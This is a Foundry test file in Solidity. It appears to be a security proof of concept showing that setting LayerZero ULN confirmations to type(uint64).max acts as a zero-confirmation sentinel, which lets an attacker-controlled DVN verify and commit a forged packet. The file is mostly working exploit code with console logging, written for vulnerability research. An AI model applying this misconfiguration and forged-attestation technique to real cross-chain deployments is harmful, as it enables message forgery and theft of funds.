// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { MyRealOApp } from "../src/MyRealOApp.sol";
import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
import { UlnConfig } from "@layerzerolabs/lz-evm-messagelib-v2/contracts/uln/UlnBase.sol";
import { ILayerZeroEndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { console2 } from "forge-std/console2.sol";

interface IReceiveUln302Commit {
    function commitVerification(bytes calldata _packetHeader, bytes32 _payloadHash) external;
}

contract RealConfirmationsSentinelTrap is TestHelperOz5 {
    MyRealOApp aApp;
    MyRealOApp bApp;
    uint32 aEid = 1;
    uint32 bEid = 2;
    address OWNER = address(0x1111);
    address ATTACKER = address(0xDEAD);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(2, LibraryType.UltraLightNode);
        vm.deal(OWNER, 100 ether);

        aApp = new MyRealOApp(address(endpoints[aEid]), OWNER);
        bApp = new MyRealOApp(address(endpoints[bEid]), OWNER);

        vm.prank(OWNER);
        aApp.setPeer(bEid, bytes32(uint256(uint160(address(bApp)))));
        vm.prank(OWNER);
        bApp.setPeer(aEid, bytes32(uint256(uint160(address(aApp)))));
    }

    function test_ATTACK_ConfirmationsSentinelTrap_ON_REAL_CODE() public {
        ILayerZeroEndpointV2 bEndpoint = ILayerZeroEndpointV2(address(endpoints[bEid]));
        (address receiveLib, ) = bEndpoint.getReceiveLibrary(address(bApp), aEid);

        address[] memory req = new address[](1);
        req[0] = ATTACKER;

        // The OWNER believes they are setting the STRICTEST possible
        // confirmation depth by using type(uint64).max - the natural,
        // intuitive reading of "max" as "require the most confirmations
        // possible." In reality, per real UlnBase's own documented
        // sentinel semantics, this means "confirmations = 0 required."
        UlnConfig memory trapConfig = UlnConfig({
            confirmations: type(uint64).max,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: req,
            optionalDVNs: new address[](0)
        });
        SetConfigParam[] memory params = new SetConfigParam[](1);
        params[0] = SetConfigParam({eid: aEid, configType: 2, config: abi.encode(trapConfig)});

        console2.log("OWNER sets confirmations = type(uint64).max, BELIEVING this means 'strictest possible'...");
        vm.prank(OWNER);
        bEndpoint.setConfig(address(bApp), receiveLib, params);
        console2.log("Config accepted by real setConfig (passed the DVN-count catch-all check).");

        bytes32 senderB32 = bytes32(uint256(uint160(address(aApp))));
        bytes32 receiverB32 = bytes32(uint256(uint160(address(bApp))));
        uint64 fakeNonce = 1;
        bytes memory packetHeader = abi.encodePacked(
            uint8(1), fakeNonce, aEid, senderB32, bEid, receiverB32
        );
        bytes32 fakePayloadHash = keccak256("sentinel trap attack payload");

        // ATTACKER (the configured required "DVN") attests with the
        // SHALLOWEST possible confirmation depth - just 1.
        console2.log("ATTACKER attests with confirmations=1 (shallowest possible depth)...");
        vm.prank(ATTACKER);
        (bool verifySuccess, ) = receiveLib.call(
            abi.encodeWithSignature("verify(bytes,bytes32,uint64)", packetHeader, fakePayloadHash, uint64(1))
        );
        console2.log("verify() call success:", verifySuccess);

        console2.log("Attempting commitVerification - does 'max confirmations required' actually mean zero?");
        vm.prank(ATTACKER);
        try IReceiveUln302Commit(receiveLib).commitVerification(packetHeader, fakePayloadHash) {
            console2.log("!!!!! COMMIT SUCCEEDED - the 'strictest' setting behaved as ZERO required confirmations !!!!!");
        } catch Error(string memory reason) {
            console2.log("commitVerification REVERTED with reason:", reason);
        } catch (bytes memory lowLevelData) {
            console2.log("commitVerification REVERTED with custom error, data length:", lowLevelData.length);
        }
    }
}
